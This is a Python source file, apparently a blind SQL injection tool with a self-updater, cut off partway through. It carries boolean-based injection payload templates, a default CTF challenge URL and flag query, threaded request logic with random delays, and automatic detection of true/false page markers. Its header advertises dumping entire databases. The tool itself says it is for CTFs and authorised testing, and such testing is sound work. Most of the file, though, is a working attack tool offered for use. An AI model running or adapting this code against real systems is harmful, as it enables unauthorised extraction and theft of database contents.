#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
通用 Boolean-Based SQL 盲注提取脚本
适用范围：CTF / 授权测试 / 本地靶场

特性：
- GET / POST
- Header / Cookie / Proxy
- requests.Session 连接复用
- 线程本地 Session
- 请求重试与随机延迟
- 自动 true_mark 探测：marker / length / status_code 三级策略
- 长度二分探测
- 字符 ASCII 二分 + 可选边界预检 + 等值校验
- 支持线程并发
- 支持断点续传 / 中间结果落盘，带保存节流
- 支持 --hex 自动包装查询结果为 hex(({query}))
- 支持 --probe-closure 自动探测数字型/字符型基础闭合方式
- 支持 --no-verify 跳过 TLS 证书校验（自签名证书目标）
- 支持 --dump（跳过系统库）/ --dump-all（含系统库）全量拉取数据并保存到 result/ 目录
- 支持 --dump-flag <关键词> 在用户库中搜索表名/列名/数据并高亮命中
- 支持 --view [URL] 查看历史 dump 记录
- Windows 下退出时自动停留等待回车，避免双击运行窗口一闪而过（--non-interactive 可禁用）
- 可选 verbose 调试输出

注意：请仅在 CTF、靶场或明确授权的环境中使用。
"""

import argparse
import random
import re
from difflib import SequenceMatcher
import string
import sys
import os
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from threading import Lock
from typing import Dict, List, Literal, Optional, Tuple, Union
from urllib.parse import quote, urlsplit, urlunsplit

import hashlib
import json
import shutil
import subprocess
import zipfile
import urllib.request

import requests

__version__ = "1.5.2"
DEFAULT_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
)

# Windows 中文环境控制台默认 GBK，无法编码 ⚡/✓ 等字符会直接崩溃；
# 统一改为 UTF-8 输出并做替换容错。
for _stream in (sys.stdout, sys.stderr):
    if hasattr(_stream, "reconfigure"):
        try:
            _stream.reconfigure(encoding="utf-8", errors="replace")
        except Exception:
            pass


# ---------- 颜色支持检测与 Windows 兼容层 ----------
def supports_color() -> bool:
    """检测当前终端是否支持 ANSI 颜色。"""
    if os.getenv("NO_COLOR"):          # 用户主动禁用颜色
        return False
    if not hasattr(sys.stdout, "isatty") or not sys.stdout.isatty():
        return False
    # Windows 需要特别处理
    if sys.platform == "win32":
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            # 启用虚拟终端处理 (ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004)
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
            return True
        except Exception:
            return False
    # Linux / macOS / WSL 等默认支持（只要 isatty 为 True）
    return True

# ---------- 颜色常量（根据支持情况决定是否使用转义码） ----------
if supports_color():
    PURPLE = "\033[95m"
    YELLOW = "\033[93m"
    WHITE  = "\033[97m"
    RED    = "\033[91m"
    RESET  = "\033[0m"
else:
    PURPLE = YELLOW = WHITE = RED = RESET = ""

# ---------- 你的 LOGO 保持不变 ----------
LOGO = rf"""
{PURPLE}      /)/)                -------              |
{PURPLE}     ({YELLOW}⚡{PURPLE}.{YELLOW}⚡{PURPLE})                |                  |              *
{PURPLE}    o(_(")(")               |                  |       ___
{PURPLE}    ~~~~~~~~~~~~~~~~~~~~    |    |   |  |  |   |      /   \   |
{PURPLE}    「{YELLOW}坚持有什么意义？{PURPLE}      |    |   |  |  |   |     |————|   |
{PURPLE}      坚持会告诉你」        |    |___|  |__|   |____  \___    |
{PURPLE}    ~~~~~~~~~~~~~~~~~~~~
{RESET}
"""



# ================= 版本检查与自更新（参考 CLIENT_DEV_GUIDE.md） =================
APP_KEY = "sqli"
CHECK_URL = "https://tuulei.cn/versions/server_check.php"
APP_DIR = Path(__file__).resolve().parent
VERSION_FILE = APP_DIR / ".version"
# 更新暂存区放在程序目录同级（同卷才能整体重命名替换），不要放进程序目录
UPDATE_STAGE = APP_DIR.parent / (".{}.update".format(APP_DIR.name))
BACKUP_DIR = Path(os.environ.get("LOCALAPPDATA", str(Path.home()))) / "SQLiTool" / "backups"
HELPER_DIR = Path(os.environ.get("TEMP", str(Path.home()))) / "sqli-update"


def get_current_version() -> str:
    try:
        v = VERSION_FILE.read_text(encoding="utf-8").strip()
        if re.fullmatch(r"\d+(\.\d+){0,2}", v):
            return v
    except Exception:
        pass
    return __version__


def check_update() -> Tuple[bool, Optional[dict]]:
    """向服务端上报 app + version，返回 (是否成功, 响应 JSON)。"""
    version = get_current_version()
    url = "{}?app={}&version={}".format(CHECK_URL, quote(APP_KEY), quote(version))
    for delay in (2, 4, 8):
        try:
            with urllib.request.urlopen(url, timeout=10) as resp:
                if resp.status == 200:
                    return True, json.loads(resp.read().decode("utf-8"))
                return False, None
        except Exception:
            time.sleep(delay)
    return False, None


def ask_update(info: dict, current: str) -> bool:
    """有更新时总是询问，跳过不记忆。返回 True 表示选择更新。"""
    print()
    print("[+] 发现新版本：v{}（当前 v{}）".format(info.get("latest_version", "?"), current))
    if info.get("release_date"):
        print("    发布日期：{}".format(info["release_date"]))
    if info.get("changelog_url"):
        print("    更新日志：{}".format(info["changelog_url"]))
    print()
    while True:
        try:
            ans = input("是否立即更新？[U] 更新 / [S] 跳过: ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            return False
        if ans.startswith("u"):
            return True
        if ans.startswith("s"):
            print("已跳过本次更新。")
            return False
        print("请输入 U（更新）或 S（跳过）。")


def make_backup(version: str) -> Path:
    """备份当前应用目录（含 result 用户数据），保留最近 2 份。"""
    BACKUP_DIR.mkdir(parents=True, exist_ok=True)
    stamp = time.strftime("%Y%m%d%H%M%S")
    zip_path = BACKUP_DIR / "backup-{}-{}.zip".format(version, stamp)
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for f in APP_DIR.rglob("*"):
            if "__pycache__" in f.parts:
                continue
            if f.is_file():
                zf.write(f, f.relative_to(APP_DIR).as_posix())
    backups = sorted(BACKUP_DIR.glob("backup-*.zip"), key=lambda p: p.stat().st_mtime, reverse=True)
    for old in backups[2:]:
        try:
            old.unlink()
        except OSError:
            pass
    return zip_path


def extract_safe(zip_path: Path, dest_dir: Path) -> None:
    """zip-slip 防护解压：拒绝 ../、绝对路径、反斜杠、盘符。"""
    dest_dir.mkdir(parents=True, exist_ok=True)
    dest_root = dest_dir.resolve()
    with zipfile.ZipFile(zip_path) as zf:
        for info in zf.infolist():
            name = info.filename
            if not name:
                continue
            if name.startswith("/") or ":" in name or "\\" in name or ".." in name.split("/"):
                raise ValueError("zip-slip: 非法路径 {}".format(name))
            target = (dest_dir / name).resolve()
            try:
                target.relative_to(dest_root)
            except ValueError:
                raise ValueError("zip-slip: 路径越界 {}".format(name))
            if name.endswith("/"):
                target.mkdir(parents=True, exist_ok=True)
            else:
                target.parent.mkdir(parents=True, exist_ok=True)
                with zf.open(info) as src, open(target, "wb") as out:
                    out.write(src.read())


def do_update(info: dict) -> bool:
    """执行更新：备份 -> 下载 -> SHA256 校验 -> 解压 -> 交给后台助手替换并重启。"""
    current = get_current_version()
    latest = str(info.get("latest_version") or "")
    dl_url = str(info.get("download_url") or "")
    sha = str(info.get("sha256") or "")
    if not dl_url or not sha:
        print("[!] 服务端暂未提供安装包（download_url / sha256 为空），暂不可更新。")
        return False
    if not dl_url.startswith("https://"):
        print("[!] 下载地址不是 HTTPS，已按安全要求拒绝更新。")
        return False

    print()
    print("[*] 开始更新：v{} -> v{}".format(current, latest))

    print("[*] 正在备份当前目录...")
    backup = make_backup(current)
    print("[+] 备份完成: {}".format(backup))

    if UPDATE_STAGE.exists():
        shutil.rmtree(UPDATE_STAGE, ignore_errors=True)
    UPDATE_STAGE.mkdir(parents=True, exist_ok=True)
    zip_path = UPDATE_STAGE / "{}-{}.zip".format(APP_KEY, latest)

    try:
        print("[*] 正在下载更新包...")
        urllib.request.urlretrieve(dl_url, zip_path)
    except Exception as e:
        print("[!] 下载失败: {}".format(e))
        shutil.rmtree(UPDATE_STAGE, ignore_errors=True)
        return False

    print("[*] 正在校验 SHA256...")
    actual = hashlib.sha256(zip_path.read_bytes()).hexdigest()
    if actual.lower() != sha.lower():
        print("[!] SHA256 校验不一致，更新中止。")
        shutil.rmtree(UPDATE_STAGE, ignore_errors=True)
        return False
    print("[+] SHA256 校验通过。")

    extract_dir = UPDATE_STAGE / "pkg"
    try:
        print("[*] 正在解压更新包...")
        extract_safe(zip_path, extract_dir)
    except Exception as e:
        print("[!] 解压失败: {}".format(e))
        shutil.rmtree(UPDATE_STAGE, ignore_errors=True)
        return False

    # 兼容带/不带顶层目录的安装包
    entries = list(extract_dir.iterdir())
    if len(entries) == 1 and entries[0].is_dir():
        new_root = entries[0]
    else:
        new_root = extract_dir
    if not (new_root / "blind_sqli.py").exists():
        print("[!] 更新包中未找到 blind_sqli.py，更新中止。")
        shutil.rmtree(UPDATE_STAGE, ignore_errors=True)
        return False

    # 整体替换交给后台助手：等本进程退出后改名保留旧目录 -> 新目录就位 ->
    # 合并用户数据 -> 写 .version -> 删旧目录 -> 重启。
    HELPER_DIR.mkdir(parents=True, exist_ok=True)
    helper = HELPER_DIR / "do_update.py"
    helper.write_text(HELPER_SCRIPT, encoding="utf-8")

    stamp = time.strftime("%Y%m%d%H%M%S")
    old_dir = APP_DIR.parent / (".{}.old.{}".format(APP_DIR.name, stamp))
    launcher = APP_DIR / "blind_sqli.py"

    cmd = [
        sys.executable, str(helper),
        "--parent-pid", str(os.getpid()),
        "--target", str(APP_DIR),
        "--new", str(new_root),
        "--old", str(old_dir),
        "--version", latest,
        "--launcher", str(launcher),
        "--stage", str(UPDATE_STAGE),
        "--",
    ]
    cmd.extend(sys.argv[1:])

    print()
    print("[+] 更新包已就绪，正在应用并重启...")
    print("[*] 程序会自动重启，无需手动操作。")
    try:
        subprocess.Popen(
            cmd,
            cwd=str(APP_DIR.parent),
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
        )
        return True
    except Exception as e:
        print("[!] 启动更新进程失败: {}".format(e))
        return False


def run_startup_update_check() -> None:
    """启动时检查更新：有更新总是询问；选择更新则执行并退出本进程。"""
    version = get_current_version()
    print("[*] 正在检查更新（v{}）...".format(version))
    ok, info = check_update()
    if not ok or not info:
        print("[!] 检查更新失败（已跳过，不影响使用）")
        return
    if info.get("is_latest"):
        return
    if ask_update(info, version):
        if do_update(info):
            print()
            sys.exit(0)
        print()


HELPER_SCRIPT = r'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""self-update helper: wait for the old process to exit, then swap app dirs."""
import argparse
import ctypes
import os
import shutil
import subprocess
import sys
import time
from pathlib import Path

LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "update.log")


def log(msg: str) -> None:
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write("{}  {}\n".format(time.strftime("%Y-%m-%d %H:%M:%S"), msg))
    except Exception:
        pass


def popup(text: str) -> None:
    try:
        ctypes.windll.user32.MessageBoxW(0, text, "更新失败", 0x10)
    except Exception:
        pass


def process_exists(pid: int) -> bool:
    PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
    SYNCHRONIZE = 0x00100000
    handle = ctypes.windll.kernel32.OpenProcess(
        PROCESS_QUERY_LIMITED_INFORMATION | SYNCHRONIZE, False, pid)
    if handle:
        ctypes.windll.kernel32.CloseHandle(handle)
        return True
    return False


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--parent-pid", type=int, required=True)
    parser.add_argument("--target", required=True)
    parser.add_argument("--new", required=True)
    parser.add_argument("--old", required=True)
    parser.add_argument("--version", required=True)
    parser.add_argument("--launcher", required=True)
    parser.add_argument("--stage", default="")
    args, relaunch = parser.parse_known_args()

    target = Path(args.target)
    new = Path(args.new)
    old = Path(args.old)

    os.chdir(os.environ.get("TEMP", str(Path.home())))

    log("start apply update v{}".format(args.version))
    deadline = time.time() + 120
    while time.time() < deadline and process_exists(args.parent_pid):
        time.sleep(0.5)
    if process_exists(args.parent_pid):
        log("parent still running after timeout")
        popup("等待旧程序退出超时，更新未执行。")
        return 3

    try:
        if old.exists():
            shutil.rmtree(old, ignore_errors=True)
        os.rename(str(target), str(old))
        log("old dir renamed")
        os.rename(str(new), str(target))
        log("new dir in place")

        # 用户数据：result/ 目录合并保留
        old_result = old / "result"
        if old_result.exists():
            new_result = target / "result"
            new_result.mkdir(parents=True, exist_ok=True)
            for item in old_result.iterdir():
                dst = new_result / item.name
                if not dst.exists():
                    if item.is_dir():
                        shutil.copytree(item, dst)
                    else:
                        shutil.copy2(item, dst)
            log("user data merged")

        (target / ".version").write_text(args.version, encoding="ascii")
        log("version persisted")

        if not (target / "blind_sqli.py").exists():
            raise RuntimeError("new dir missing blind_sqli.py")

        shutil.rmtree(old, ignore_errors=True)
        log("old dir removed")
        if args.stage and Path(args.stage).exists():
            shutil.rmtree(Path(args.stage), ignore_errors=True)

        if args.launcher and Path(args.launcher).exists():
            cmd = [sys.executable, str(Path(args.launcher))] + list(relaunch)
            subprocess.Popen(cmd, cwd=str(target),
                             creationflags=getattr(subprocess, "CREATE_NEW_CONSOLE", 0))
            log("app relaunched")
        return 0
    except Exception as e:
        log("update failed: {}".format(e))
        try:
            if old.exists():
                if target.exists():
                    shutil.rmtree(target, ignore_errors=True)
                os.rename(str(old), str(target))
        except Exception:
            pass
        popup("更新失败：{}，已恢复原版本。".format(e))
        if args.launcher and Path(args.launcher).exists():
            try:
                subprocess.Popen([sys.executable, str(Path(args.launcher))] + list(relaunch),
                                 cwd=str(target),
                                 creationflags=getattr(subprocess, "CREATE_NEW_CONSOLE", 0))
            except Exception:
                pass
        return 1


if __name__ == "__main__":
    sys.exit(main())
'''




DEFAULT_URL = "http://challenge-65d2371abb28992c.sandbox.ctfhub.com:10800/index.php"
DEFAULT_PARAM = "id"
DEFAULT_TRUE_MARK = "Practice makes perfect."
DEFAULT_QUERY = "select flag from ctfhub.flag"
DEFAULT_PAYLOAD = "1 and ascii(substr(({query}),{i},1))>{mid}"
DEFAULT_EQ_PAYLOAD = "1 and ascii(substr(({query}),{i},1))={mid}"
DEFAULT_LEN_PAYLOAD = "1 and length(({query}))>{mid}"
DEFAULT_TRUE_PAYLOAD = "1 and 1=1"
DEFAULT_FALSE_PAYLOAD = "1 and 1=2"
DEFAULT_MAX_LEN = 128
DEFAULT_CHARSET = string.printable[:95]
DEFAULT_HEX_CHARSET = "0123456789ABCDEFabcdef"
DEFAULT_THREADS = 1
DEFAULT_TIMEOUT = 6.0
DEFAULT_RETRIES = 3
DEFAULT_DELAY = 0.0
DEFAULT_CLOSURE_TEST_EXPR_TRUE = "1=1"
DEFAULT_CLOSURE_TEST_EXPR_FALSE = "1=2"
UNKNOWN = "?"
CharResult = Union[str, Literal["?"]]

print_lock = Lock()
file_lock = Lock()
thread_local = threading.local()
_HTML_COMMENT_RE = re.compile(r"<!--.*?-->", re.S)
_WS_RE = re.compile(r"\s+")
PROGRESS_CLEAR = "\033[K" if supports_color() else ""


@dataclass
class Config:
    url: str
    param: str
    query: str
    payload: str
    eq_payload: str
    len_payload: Optional[str]
    true_payload: str
    false_payload: str
    true_mark: str
    check_mode: Literal["marker", "length_gt", "length_lt", "status_code"]
    length_threshold: Optional[float]
    status_code: Optional[int]
    method: str
    timeout: float
    retries: int
    delay: float
    jitter: float
    max_len: int
    threads: int
    charset: str
    no_length_detect: bool
    check_boundary: bool
    probe_closure: bool
    probe_samples: int
    headers: Dict[str, str]
    cookies: Dict[str, str]
    proxies: Optional[Dict[str, str]]
    resume_file: Optional[Path]
    save_every: int
    save_interval: float
    auto_mark: bool
    auto_samples: int
    auto_min_marker_len: int
    auto_lcs_limit: int
    normalize_response: bool
    verbose: bool
    dump: bool = False
    dump_all: bool = False
    dump_flag: Optional[str] = None
    verify: bool = True
    sorted_chars: List[str] = field(default_factory=list)

    def __post_init__(self) -> None:
        self.sorted_chars = sorted(set(self.charset), key=ord)
        if not self.sorted_chars:
            raise ValueError("charset 不能为空")


def parse_kv(items, sep: str) -> Dict[str, str]:
    result = {}
    if not items:
        return result
    for item in items:
        if sep not in item:
            raise ValueError(f"格式错误: {item!r}，应为 key{sep}value")
        k, v = item.split(sep, 1)
        k, v = k.strip(), v.strip()
        if not k:
            raise ValueError(f"键不能为空: {item!r}")
        result[k] = v
    return result


def sleep_before_request(delay: float, jitter: float) -> None:
    wait = delay + random.uniform(0, max(jitter, 0))
    if wait > 0:
        time.sleep(wait)


def new_session(cfg: Config) -> requests.Session:
    """创建带常用默认值的请求会话：浏览器 UA + 可选跳过 TLS 校验。"""
    session = requests.Session()
    session.verify = cfg.verify
    if "User-Agent" not in cfg.headers:
        session.headers["User-Agent"] = DEFAULT_UA
    return session


def get_thread_session(cfg: Config) -> requests.Session:
    if not hasattr(thread_local, "session"):
        thread_local.session = new_session(cfg)
    return thread_local.session


def send_raw(session: requests.Session, cfg: Config, payload: str) -> Optional[requests.Response]:
    for attempt in range(1, cfg.retries + 1):
        sleep_before_request(cfg.delay, cfg.jitter)
        try:
            kwargs = dict(
                headers=cfg.headers,
                cookies=cfg.cookies,
                proxies=cfg.proxies,
                timeout=cfg.timeout,
            )
            if cfg.method.upper() == "GET":
                resp = session.get(cfg.url, params={cfg.param: payload}, **kwargs)
            else:
                resp = session.post(cfg.url, data={cfg.param: payload}, **kwargs)

            if cfg.verbose:
                with print_lock:
                    print(f"\n[debug] {payload} => status={resp.status_code}, len={len(resp.text or '')}")
            return resp
        except requests.RequestException as e:
            if cfg.verbose:
                with print_lock:
                    print(f"\n[debug] 请求失败 attempt={attempt}/{cfg.retries}: {e}")
            if attempt < cfg.retries:
                time.sleep(min(1.0 * attempt, 3.0))
    return None


def evaluate_response(resp: requests.Response, cfg: Config) -> bool:
    text = resp.text or ""
    if cfg.check_mode == "marker":
        return cfg.true_mark in text
    if cfg.check_mode == "length_gt":
        return len(text) > float(cfg.length_threshold or 0)
    if cfg.check_mode == "length_lt":
        return len(text) < float(cfg.length_threshold or 0)
    if cfg.check_mode == "status_code":
        return resp.status_code == int(cfg.status_code or 200)
    raise ValueError(f"未知 check_mode: {cfg.check_mode}")


def send_check(session: requests.Session, cfg: Config, payload: str) -> Optional[bool]:
    resp = send_raw(session, cfg, payload)
    if resp is None:
        return None
    ok = evaluate_response(resp, cfg)
    if cfg.verbose:
        with print_lock:
            print(f"[debug] check={ok}, mode={cfg.check_mode}")
    return ok


def normalize_text(text: str, limit: int) -> str:
    text = text[:limit]
    text = _HTML_COMMENT_RE.sub("", text)
    text = _WS_RE.sub(" ", text)
    return text.strip()


def lcs2(a: str, b: str, limit: int) -> str:
    """
    近似 LCS：用 SequenceMatcher 提取稳定匹配块。

    这里不使用传统 DP LCS，原因是网页响应可能很长，O(n*m) 的 DP
    在 10KB+ 页面上会明显变慢甚至占用大量内存。SequenceMatcher 对
    动态页面/WAF 噪声场景通常更实用。
    """
    a, b = a[:limit], b[:limit]
    if not a or not b:
        return ""
    matcher = SequenceMatcher(None, a, b, autojunk=False)
    return "".join(a[i:i + size] for i, _, size in matcher.get_matching_blocks() if size > 0)


def multi_lcs(texts: List[str], limit: int) -> str:
    if not texts:
        return ""
    common = texts[0][:limit]
    for text in texts[1:]:
        common = lcs2(common, text, limit)
        if not common:
            break
    return common


def complement_by_subsequence(whole: str, subseq: str) -> str:
    res = []
    j = 0
    for ch in whole:
        if j < len(subseq) and ch == subseq[j]:
            j += 1
        else:
            res.append(ch)
    return "".join(res)


def diff_true_segments(a: str, b: str) -> List[str]:
    """返回 a 相对 b 中属于 a 侧的差异片段（SequenceMatcher opcodes）。"""
    segs = []
    matcher = SequenceMatcher(None, a, b, autojunk=False)
    for op, i1, i2, j1, j2 in matcher.get_opcodes():
        if op in ("delete", "replace"):
            segs.append(a[i1:i2])
    return segs


def unique_substrings(
    seg: str,
    true_texts: List[str],
    false_texts: List[str],
    min_len: int,
    cap: int = 120,
) -> List[str]:
    """
    在差异片段内寻找尽量长、且出现在所有 true 且不在任何 false 中的子串（按长度降序）。

    最终 evaluate_response() 使用的是原始 resp.text，所以 true_texts / false_texts
    应传原始文本，保证候选在真实判定时也成立。
    """
    seg = seg.strip()
    n = len(seg)
    if n < min_len:
        return []
    if all(seg in t for t in true_texts) and not any(seg in f for f in false_texts):
        return [seg]
    results = []
    max_len = min(n, cap)
    for length in range(max_len, min_len - 1, -1):
        for i in range(n - length + 1):
            cand = seg[i:i + length].strip()
            if len(cand) < min_len:
                continue
            if all(cand in t for t in true_texts) and not any(cand in f for f in false_texts):
                results.append(cand)
        if results:
            break
    return results


def longest_absent_substrings(
    seg: str,
    true_texts: List[str],
    false_texts: List[str],
    min_len: int,
    max_candidates: int = 20,
) -> List[str]:
    """
    返回 seg 中“不在任何 false 文本里”的最长子串候选（且须出现在所有 true 中）。

    从每个起点向右贪心扩展，得到该起点的最长有效子串；结果按长度降序。
    """
    seg = seg.strip()
    n = len(seg)
    cands: List[str] = []
    seen: set = set()
    for start in range(n):
        for end in range(n, start + min_len - 1, -1):
            w = seg[start:end].strip()
            if len(w) < min_len or w in seen:
                continue
            if not any(w in f for f in false_texts) and all(w in t for t in true_texts):
                seen.add(w)
                cands.append(w)
                break
    cands.sort(key=len, reverse=True)
    return cands[:max_candidates]


def expand_unique_context(
    sk_true: str,
    i1: int,
    i2: int,
    raw_true: List[str],
    raw_false: List[str],
    min_len: int,
    max_ctx: int = 40,
) -> str:
    """
    把骨架差异区向外扩展为“出现在所有 true、不在任何 false 中”的唯一窗口。

    场景：差异核心本身可能恰是 false 页面其他位置的子串（如 success 出现在 btn-success），
    此时需要更长上下文（如 query_success）才能成为稳定 marker。
    扩展过程直接以原始文本校验，保证候选在真实判定时成立。
    """
    n = len(sk_true)

    def ok(l: int, r: int) -> bool:
        w = sk_true[l:r].strip()
        return (
            len(w) >= min_len
            and all(w in t for t in raw_true)
            and not any(w in f for f in raw_false)
        )

    # 贪心扩展（双向交替，限制上下文长度）
    lo, hi = i1, i2
    while True:
        grew = False
        if lo > 0 and hi - lo < max_ctx and ok(lo - 1, hi):
            lo -= 1
            grew = True
        if hi < n and hi - lo < max_ctx and ok(lo, hi + 1):
            hi += 1
            grew = True
        if not grew:
            break
    return sk_true[lo:hi].strip() if ok(lo, hi) else ""


def find_marker_candidates(
    norm_true: List[str],
    norm_false: List[str],
    raw_true: List[str],
    raw_false: List[str],
    min_len: int,
    limit: int,
    max_candidates: int = 40,
) -> List[str]:
    """
    从 true/false 采样中寻找稳定的 true 独有子串（marker 候选，按长度降序去重）。

    核心思路：直接对比 true/false 两组公共骨架的差异，而不是只在 true 组内部找差异。
    静态页面（组内采样完全相同）下骨架就是整页，true 独有内容会被完整暴露；
    动态页面则由逐样本 diff 与组内变化策略兜底。
    """
    eff_min = max(2, min_len - 3)  # 允许比配置略短，配合验证防止误报
    candidates: List[str] = []
    seen: set = set()

    def add(seg: str) -> None:
        seg = seg.strip()
        if len(seg) < eff_min or seg in seen:
            return
        if not all(seg in t for t in raw_true):
            return
        if any(seg in f for f in raw_false):
            return
        seen.add(seg)
        candidates.append(seg)

    # 1) 组骨架差异：最主要策略
    sk_true = multi_lcs(norm_true, limit)
    sk_false = multi_lcs(norm_false, limit)
    if sk_true and sk_false:
        matcher = SequenceMatcher(None, sk_true, sk_false, autojunk=False)
        for op, i1, i2, j1, j2 in matcher.get_opcodes():
            if op not in ("delete", "replace"):
                continue
            seg = sk_true[i1:i2]
            add(seg)
            for cand in unique_substrings(seg, raw_true, raw_false, eff_min):
                add(cand)
            expanded = expand_unique_context(sk_true, i1, i2, raw_true, raw_false, eff_min)
            if expanded:
                add(expanded)
                # 收缩扩展窗口，保留更干净、也更稳的短 marker（如 query_success）
                for cand in longest_absent_substrings(expanded, raw_true, raw_false, eff_min):
                    add(cand)

    # 2) 逐样本差异：骨架太短 / 页面动态时兜底
    if len(candidates) < max_candidates:
        for t in norm_true:
            for f in norm_false:
                for seg in diff_true_segments(t, f):
                    add(seg)
                    for cand in unique_substrings(seg, raw_true, raw_false, eff_min):
                        add(cand)
                if len(candidates) >= max_candidates:
                    break
            if len(candidates) >= max_candidates:
                break

    # 3) 组内变化：页面含动态噪声时，true 独有内容可能出现在变化部分
    if len(candidates) < max_candidates:
        common_true = multi_lcs(norm_true, limit)
        common_false = multi_lcs(norm_false, limit)
        true_diffs = [complement_by_subsequence(t, common_true) for t in norm_true]
        false_diffs = [complement_by_subsequence(f, common_false) for f in norm_false]
        for t_diff in true_diffs:
            for cand in unique_substrings(t_diff, raw_true, raw_false, eff_min):
                add(cand)
            if len(candidates) >= max_candidates:
                break

    candidates.sort(key=len, reverse=True)
    return candidates[:max_candidates]


def collect_baselines(session: requests.Session, cfg: Config) -> Tuple[List[requests.Response], List[requests.Response]]:
    true_resps, false_resps = [], []
    print(f"[*] 自动探测响应特征，采样次数={cfg.auto_samples}...")
    for _ in range(cfg.auto_samples):
        tr = send_raw(session, cfg, cfg.true_payload)
        fr = send_raw(session, cfg, cfg.false_payload)
        if tr is None or fr is None:
            raise RuntimeError("基准请求失败，无法自动识别 true/false 特征")
        true_resps.append(tr)
        false_resps.append(fr)
    return true_resps, false_resps


def auto_detect_true_feature(session: requests.Session, cfg: Config) -> None:
    true_resps, false_resps = collect_baselines(session, cfg)
    raw_true = [r.text or "" for r in true_resps]
    raw_false = [r.text or "" for r in false_resps]

    if cfg.normalize_response:
        norm_true = [normalize_text(t, cfg.auto_lcs_limit) for t in raw_true]
        norm_false = [normalize_text(t, cfg.auto_lcs_limit) for t in raw_false]
    else:
        norm_true = [t[:cfg.auto_lcs_limit] for t in raw_true]
        norm_false = [t[:cfg.auto_lcs_limit] for t in raw_false]

    # 策略 1：稳定 marker（true/false 骨架对比 + 逐样本差异 + 组内变化）
    candidates = find_marker_candidates(
        norm_true,
        norm_false,
        raw_true,
        raw_false,
        cfg.auto_min_marker_len,
        cfg.auto_lcs_limit,
    )
    if candidates:
        candidates = prune_marker_candidates(session, cfg, candidates)
    for marker in candidates:
        cfg.check_mode = "marker"
        cfg.true_mark = marker
        print(f"[+] 自动识别 true_mark 候选: {marker[:80]!r}")
        if verify_auto_feature(session, cfg):
            print(f"[+] true_mark 验证通过: {marker[:80]!r}")
            return
        print("[!] marker 验证失败，尝试下一个候选...")
    if candidates:
        print("[!] 所有 marker 候选验证失败，降级到长度/状态码策略。")

    # 策略 2：长度阈值。要求两组长度区间严格分离（间隔可小至 2 字节），
    # 并用多组真实请求验证阈值可靠。
    # 注意：evaluate_response() 的 length_gt / length_lt 使用的是原始 resp.text 长度，
    # 所以这里也必须使用原始响应长度，不能使用 normalize 后的 true_texts / false_texts。
    true_lens = [len(r.text or "") for r in true_resps]
    false_lens = [len(r.text or "") for r in false_resps]
    min_t, max_t = min(true_lens), max(true_lens)
    min_f, max_f = min(false_lens), max(false_lens)
    gap = max(min_t, min_f) - min(max_t, max_f)
    if max_t < min_f and gap >= 2:
        cfg.check_mode = "length_lt"
        cfg.length_threshold = (max_t + min_f) / 2
        print(f"[+] 自动识别长度规则: len(resp) < {cfg.length_threshold:.1f}")
        if verify_auto_feature(session, cfg):
            return
        print("[!] 长度规则验证失败。")
    if max_f < min_t and gap >= 2:
        cfg.check_mode = "length_gt"
        cfg.length_threshold = (max_f + min_t) / 2
        print(f"[+] 自动识别长度规则: len(resp) > {cfg.length_threshold:.1f}")
        if verify_auto_feature(session, cfg):
            return
        print("[!] 长度规则验证失败。")

    # 策略 3：状态码。
    true_codes = [r.status_code for r in true_resps]
    false_codes = [r.status_code for r in false_resps]
    if len(set(true_codes)) == 1 and true_codes[0] not in set(false_codes):
        cfg.check_mode = "status_code"
        cfg.status_code = true_codes[0]
        print(f"[+] 自动识别状态码规则: status_code == {cfg.status_code}")
        if verify_auto_feature(session, cfg):
            return
        print("[!] 状态码规则验证失败。")

    raise RuntimeError("无法自动识别 true/false 响应特征，请手动指定 --true-mark 或调整 --true-payload/--false-payload")


def prune_marker_candidates(
    session: requests.Session,
    cfg: Config,
    candidates: List[str],
) -> List[str]:
    """
    用一次“提取阶段真实 payload”请求过滤候选，剔除落在回显区（随 payload 变化）的 marker。
    """
    try:
        true_probe = cfg.payload.format(query=cfg.query, i=1, mid=0)
        false_probe = cfg.payload.format(query=cfg.query, i=1, mid=255)
        tr = send_raw(session, cfg, true_probe)
        fr = send_raw(session, cfg, false_probe)
    except Exception:
        return candidates
    if tr is None or fr is None:
        return candidates
    true_text = tr.text or ""
    false_text = fr.text or ""
    kept = [c for c in candidates if c in true_text and c not in false_text]
    if kept and len(kept) < len(candidates):
        print(f"[*] 用提取 payload 复核，过滤掉 {len(candidates) - len(kept)} 个回显区候选。")
    if kept:
        return kept
    # 全部被过滤时退而求其次：最短的候选更可能落在稳定文本区（而非回显区）
    print("[!] 全部候选未通过提取 payload 复核，改用最短候选继续尝试。")
    return sorted(candidates, key=len)[:3]


def verify_auto_feature(session: requests.Session, cfg: Config, pairs: int = 2) -> bool:
    """
    用多组独立请求验证识别出的特征，避免单次请求抖动造成误判。

    额外用“提取阶段真实 payload”（{mid}=0 永真 / {mid}=255 永假）复核，
    防止特征落在回显区（基线 payload 与提取 payload 不同导致 marker 失效）。
    """
    try:
        true_probe = cfg.payload.format(query=cfg.query, i=1, mid=0)
        false_probe = cfg.payload.format(query=cfg.query, i=1, mid=255)
    except Exception:
        true_probe = false_probe = None

    for _ in range(max(pairs, 1)):
        tr = send_raw(session, cfg, cfg.true_payload)
        fr = send_raw(session, cfg, cfg.false_payload)
        if tr is None or fr is None:
            return False
        if evaluate_response(tr, cfg) is not True or evaluate_response(fr, cfg) is not False:
            return False
        if true_probe is not None:
            tr2 = send_raw(session, cfg, true_probe)
            fr2 = send_raw(session, cfg, false_probe)
            if tr2 is None or fr2 is None:
                return False
